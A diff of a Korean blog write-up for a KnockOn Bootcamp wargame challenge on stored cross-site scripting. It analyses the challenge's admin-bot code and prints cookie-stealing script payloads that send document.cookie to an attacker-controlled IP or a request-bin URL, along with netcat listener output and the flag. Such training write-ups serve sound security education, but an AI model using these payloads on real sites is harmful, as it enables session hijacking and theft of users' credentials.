@@ -1,55 +1,34 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 4. Xross Site Scripting"
+title: "KnockOn Bootcamp 2nd - 4. Cross-Site Scripting"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
+  - KnockOn Bootcamp 2nd
+  - XSS
   - Stored XSS
-last_modified_at: 2024-09-01T00:10:00-05:00
+last_modified_at: 2024-09-01T14:10:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10006/>
 
-![4. Xross Site Scripting 1](/assets/images/writeup/web-hacking/knock-on/4_XSS_1.png)
+![4. Xross Site Scripting 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-1.png)
 
-![4. Xross Site Scripting 2](/assets/images/writeup/web-hacking/knock-on/4_XSS_2.png)
+![4. Xross Site Scripting 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-2.png)
 
-![4. Xross Site Scripting 3](/assets/images/writeup/web-hacking/knock-on/4_XSS_3.png)
-
-|
-
-|
-
-|
+![4. Xross Site Scripting 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-3.png)
 
 ### 목표
 
----
-
 게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기
 
-|
-
 ### 공격 기법
-
----
 
 Cross Site Scripting
 
 - Stored XSS
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -198,17 +177,9 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10006, debug=True)
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### real_url()
-
----
 
 ```python
 def read_url(url, cookie={"name": "name", "value": "value"}):
@@ -242,15 +213,11 @@ def read_url(url, cookie={"name": "name", "value": "value"}):
         return True
 ```
 
-|
-
 ```jsx
 def read_url(url, cookie={"name": "name", "value": "value"}):
 ```
 
 `cookie` 기본값 설정. 호출 시 다른 값으로 변경 가능
-
-|
 
 ```python
 service = Service(executable_path=CHROMEDRIVER_PATH)
@@ -261,8 +228,6 @@ options = webdriver.ChromeOptions()
 `Selenium WebDriver`가 크롬 브라우저를 제어하도록 하는 `service` 객체 생성
 
 크롬 브라우저에 대한 옵션 설정을 위한 `options` 객체 생성
-
-|
 
 ```python
 options.add_argument("--headless")
@@ -282,15 +247,11 @@ options.add_argument("--disable-dev-shm-usage")
 
 `--disable-dev-shm-usage`: 공유 메모리(/dev/shm) 사용 비활성. 메모리 부족 방지
 
-|
-
 ```python
 driver = webdriver.Chrome(service=service, options=options)
 ```
 
 설정된 `service`와 `options`로 `Chrome WebDriver` 초기화. 이 객체를 사용해 브라우저 제어
-
-|
 
 ```python
 driver.implicitly_wait(3) # 사전 설정
@@ -305,19 +266,13 @@ driver.get(url) # 공격자의 게시물 url
 
 `set_page_load_timeout(10)`: 전체 페이지 로드에 최대 10초 대기
 
-`get([localhost](http://localhost))`: localhost 페이지가 로드됨. 
+`get([localhost](http://localhost))`: localhost 페이지가 로드됨
 
 `add_cookie(cookie)`: 쿠키를 현재 세션에 추가
 
 `get(url)`: 지정된 url 로드
 
-|
-
-|
-
 ### admin()
-
----
 
 ```python
 def admin(post_id):
@@ -340,15 +295,11 @@ def admin(post_id):
     return render_template("board.html", posts=posts, message=message)
 ```
 
-|
-
 ```python
 target_url = localhost + f"/post/{post_id}"
 ```
 
 `target_url` 설정. post_id가 1이라면, `“http://localhost:10006/post/1”`이 됨
-
-|
 
 ```python
 if requests.get(target_url).status_code == 404:
@@ -359,15 +310,11 @@ if requests.get(target_url).status_code == 404:
 
 `target_url`이 유효하지 않으면(게시물이 없으면) `Unvalid Post ID`출력
 
-|
-
 ```python
 cookie = {"name": "cookie", "value": SECRET_KEY}
 ```
 
 `cookie`라는 이름을 가진 쿠키 객체 생성. 쿠키 이름과 값을 `cookie`, `SECRET_KEY`로 정의
-
-|
 
 ```python
 success = read_url(target_url, cookie)
@@ -376,8 +323,6 @@ success = read_url(target_url, cookie)
 `read_url()` 함수의 인자로 `target_url`과 `cookie` 설정
 
 `real_url()`은 봇이 Selenium으로 target_url에 방문하게 함. `success` 변수는 성공  여부에 따라 `true`(방문 성공) 혹은 `false`(방문 실패)
-
-|
 
 ```python
 if success:
@@ -388,8 +333,6 @@ else:
 
 `success` 성공 여부에 따라 메시지 출력
 
-|
-
 ```python
 posts = Post.query.all()
 return render_template("board.html", posts=posts, message=message)
@@ -397,13 +340,7 @@ return render_template("board.html", posts=posts, message=message)
 
 코드 실행 후에도 게시물을 보여주기 위해, 게시물 목록을 DB에서 가져와 `board.html`에 전달하여 게시물을 포함한 페이지 렌더링
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 코드 분석 결과를 정리하면
 
@@ -411,14 +348,12 @@ return render_template("board.html", posts=posts, message=message)
     1. `target_url = “http://localhost:10006/post/1”` → 변수 설정
     2. 쿠키 객체 생성 → `cookie = {“name”: ”cookie”, “value”: SECRET_KEY}`
     3. `real_url(target_url, cookie)` 함수 호출 및 인자 전달
-    
+
 2. read_url(url, cookie={"name": "name", "value": "value"}) 함수 실행
     1. `driver.get(localhost)` → localhost 페이지 로드
     2. `driver.add_cookie(cookie)` → locathost 페이지에서 쿠키 설정
     3. `driver.get(url)` → `target_url`실행
     4. `target_url`에서 악성 스크립트 실행 → **공격자의 웹 페이지로 쿠키 유출**
-
-|
 
 `driver.get(localhost)`로 localhost 페이지를 로드 하는 이유는, 쿠키의 설정 원리 때문임
 
@@ -426,36 +361,22 @@ return render_template("board.html", posts=posts, message=message)
 
 `target_url`에서 실행될, 내 웹 페이지로 쿠키를 유출하는 악성 스크립트를 작성하면 됨(XSS)
 
-|
-
-|
-
 ## Exploit 1: 내 웹 서버
 
 ### azure 설정
-
----
 
 1. 네트워크 보안 그룹(NSG) - 인바운드 규칙 추가
 2. 포트 설정(10010)
 3. 프로토콜(TCP)
 
-|
-
 ### VM 방화벽 설정
-
----
 
 ```
 sudo ufw allow 10010/tcp
 sudo ufw reload
 ```
 
-|
-
 ### 코드 작성
-
----
 
 ```jsx
  // 코드 1
@@ -481,11 +402,7 @@ sudo ufw reload
 
 **코드4**: `<script>` 태그 안에서 `setTimeout()`함수를 사용해 일정 시간 후 실행
 
-|
-
 ### **실행 결과**
-
----
 
 ```bash
 azureuser@php-dev-1:~$ nc -l -p 10010
@@ -499,16 +416,11 @@ Referer: http://localhost:10006/
 Accept-Encoding: gzip, deflate
 ```
 
-|
-
-|
-
 ## Exploit 2: dreamhack Request Bin
 
 [dreamhack tools](https://tools.dreamhack.games/main)
 
-![4. Xross Site Scripting 4](/assets/images/writeup/web-hacking/knock-on/4_XSS_4.png)
-
+![4. Xross Site Scripting 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-4.png)
 
 위 주소로 접속 후
 
@@ -516,63 +428,37 @@ Accept-Encoding: gzip, deflate
 2. 링크 생성
 3. URL복사
 
-|
-
 ```sql
 <script>location.href="https://uplgtbm.request.dreamhack.games/"+document.cookie</script>
 ```
 
-![4. Xross Site Scripting 5](/assets/images/writeup/web-hacking/knock-on/4_XSS_5.png)
-
+![4. Xross Site Scripting 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-5.png)
 
 복사한 `URL`을 `location.href`에 할당 후 `document.cookie`로 해당 URL에 쿠키 전송 코드 작성
 
-|
-
-![4. Xross Site Scripting 6](/assets/images/writeup/web-hacking/knock-on/4_XSS_6.png)
-
+![4. Xross Site Scripting 6](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-6.png)
 
 잘 게시됨
 
-|
-
-![4. Xross Site Scripting 7](/assets/images/writeup/web-hacking/knock-on/4_XSS_7.png)
-
+![4. Xross Site Scripting 7](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-7.png)
 
 게시글을 클릭하면 바로 해당 주소로 이동됨
 
-|
-
-![4. Xross Site Scripting 8](/assets/images/writeup/web-hacking/knock-on/4_XSS_8.png)
-
+![4. Xross Site Scripting 8](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-8.png)
 
 Request Bin에서 요청을 확인할 수 있음
 
-|
-
-![4. Xross Site Scripting 9](/assets/images/writeup/web-hacking/knock-on/4_XSS_9.png)
-
+![4. Xross Site Scripting 9](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-9.png)
 
 게시글 id 입력 후 Active Admin Bot 버튼을 누르면
 
-|
-
-![4. Xross Site Scripting 10](/assets/images/writeup/web-hacking/knock-on/4_XSS_10.png)
-
+![4. Xross Site Scripting 10](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-4-xss-10.png)
 
 Request Bin에 cookie가 잘 전달됨
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### 방법 1
-
----
 
 ```jsx
 <script>location.href="http://20.41.120.97:10010/"+document.cookie</script>
@@ -590,28 +476,14 @@ Request Bin에 cookie가 잘 전달됨
 <script>setTimeout( () => {location.href="http://20.41.120.97:10010/"+document.cookie;}, 1000);</script>
 ```
 
-|
-
 ### 방법 2
-
----
 
 ```jsx
 <script>location.href="https://uplgtbm.request.dreamhack.games/"+document.cookie</script>
 ```
 
-|
-
-|
-
 ### FLAG
 
----
-
 ```
-K0{Wh3r3_d1d_my_s3cr3t_k3y?} 
+K0{Wh3r3_d1d_my_s3cr3t_k3y?}
 ```
-
-|
-
----
